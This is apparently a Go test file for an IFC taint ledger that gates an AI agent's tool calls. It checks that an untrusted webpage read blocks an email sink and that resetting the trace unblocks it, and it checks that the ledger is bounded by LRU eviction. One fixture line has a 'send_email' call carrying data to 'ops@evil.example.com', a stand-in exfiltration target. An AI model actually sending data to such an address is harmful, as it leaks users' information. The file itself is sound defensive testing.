package ifc

import (
	"context"
	"fmt"
	"testing"

	"github.com/anthony-chaudhary/fak/internal/abi"
)

// TestTaintedTraceResetUnwedgesSinkOnLivePath is the issue #493 leg 3 witness: a
// tainted IFC trace wedges every sensitive sink (the issue's "the first untrusted
// read wedges every sink until restart"), and a per-trace Ledger.Reset on the
// live path — the exact call the /v1/fak/trace/reset route's resetTrace handler
// makes via ifc.Default.Reset — clears the high-water mark so the sink un-wedges,
// with no process restart.
func TestTaintedTraceResetUnwedgesSinkOnLivePath(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	stamp := NewStampGate(led, Policy{})
	sink := NewSinkGate(led, Policy{})

	const trace = "wedged"
	// An untrusted external read raises the trace's control-flow high-water mark.
	stamp.Admit(ctx, &abi.ToolCall{Tool: "read_webpage", TraceID: trace}, resultOf("external page body"))
	if led.Level(trace) != abi.TaintTainted {
		t.Fatalf("an external read must taint the trace, got %s", taintName(led.Level(trace)))
	}

	email := &abi.ToolCall{Tool: "send_email", TraceID: trace,
		Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"to":"ops@evil.example.com","body":"data"}`)}}

	// Wedged: the tainted session bars the egress sink until the trace is cleared.
	if v := sink.Adjudicate(ctx, email); v.Kind != abi.VerdictDeny || v.Reason != abi.ReasonTrustViolation {
		t.Fatalf("tainted egress must be DENIED before reset, got %v/%s", v.Kind, abi.ReasonName(v.Reason))
	}

	// Reset on the live path — ifc.Default.Reset is exactly what resetTrace calls.
	led.Reset(trace)
	if led.Level(trace) != abi.TaintTrusted {
		t.Fatalf("reset must clear the high-water mark to Trusted, got %s", taintName(led.Level(trace)))
	}

	// Un-wedged: the SAME sink now Defers (allowed) — no restart, no new process.
	if v := sink.Adjudicate(ctx, email); v.Kind != abi.VerdictDefer {
		t.Fatalf("after a live-path reset the sink must un-wedge (Defer), got %v/%s", v.Kind, abi.ReasonName(v.Reason))
	}
}

// TestLedgerStaysBoundedOverLongSyntheticRun is the issue #493 leg 2 witness:
// over a long synthetic run that raises the high-water mark for far more distinct
// traces than the ledger's cap, the retained-mark count stays bounded by its
// limit (LRU eviction) instead of accreting one entry per trace forever. A
// store-size bound after N >> cap inserts is the witnessable proxy the acceptance
// criterion names for "RSS/state stays flat over a long run".
func TestLedgerStaysBoundedOverLongSyntheticRun(t *testing.T) {
	const limit = 64
	const inserts = 20000
	led := NewLedgerWithLimit(limit)

	for i := 0; i < inserts; i++ {
		led.Raise(fmt.Sprintf("trace-%d", i), abi.TaintTainted)
		if got := led.Len(); got > limit {
			t.Fatalf("after %d inserts Len=%d exceeded cap %d (state accreting unbounded)", i+1, got, limit)
		}
	}
	if got := led.Len(); got != limit {
		t.Fatalf("after %d inserts Len=%d, want exactly the cap %d", inserts, got, limit)
	}
	// The most-recent traces are retained; an early trace was evicted to Trusted.
	if got := led.Level("trace-0"); got != abi.TaintTrusted {
		t.Fatalf("an early trace must have been evicted to Trusted, got %s", taintName(got))
	}
	if got := led.Level(fmt.Sprintf("trace-%d", inserts-1)); got != abi.TaintTainted {
		t.Fatalf("the most-recent trace must be retained Tainted, got %s", taintName(got))
	}
}
